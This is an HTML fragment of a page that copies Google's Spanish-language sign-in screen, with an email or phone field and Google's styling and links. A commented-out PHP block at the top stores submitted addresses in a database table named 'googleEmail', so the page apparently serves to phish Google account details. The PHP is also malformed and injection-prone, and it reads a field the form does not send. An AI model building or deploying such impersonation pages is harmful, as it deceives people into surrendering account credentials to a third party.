<!-- <?php 
require "serve/conn.php";
$email=$_POST['email'];

$subir=mysqli_query($conection,$almacenar='INSERT INTO `googleEmail` (`email`) VALUES $email") ')
?> -->
...
<body>
  <div class="container">
    <div class="d-flex justify-content-center justify-content-center align-items-center vh-100">
      <div class="caja">
        <div class="container">
          <div class="row">
            ...
            <div class="col-lg-12 mb-4 ">
              <div class="usar text-center">
                <span class="">Usa tu Cuenta&nbsp;de&nbsp;Google</span>
              </div>
            </div>
            <form action="/" method="post">
              ...
              <div class="col-lg-12">
                <div class="form-floating">
                  <input class="inputCorreo form-control form-control-lg" type="text" id="correo"
                    placeholder="Correo electronico o telefono" name="correo" />
                  <label for="correo">Correo electronico o Telefono</label>
                </div>
              </div>

              <div class="col-lg-12  mt-2">
                <button class="olvidaste" type="button">
          ...
          <div class="col-lg-12 mt-4">
            <div class="masInformacion">
              ...
              de forma privada.
              <a class="linkInformacion" href="https://support.google.com/chrome/answer/6130773?hl=es-419"
                jsname="JFyozc" target="_blank" aria-label="Más información para usar el modo de invitado">Más
                información</a>
            </div>
          </div>
          ...
          <div class="col-lg-12 mt-5">
            <div class="caja2">
              <div class="crearCuenta">
                <span jsname="V67aGc" class="VfPpkd-vQzf8d">Crear cuenta</span>
              </div>

              <div>
                <button class="botonSiguiente btn btn-primary">
                  Siguiente
                </button>
              </div>
            </div>
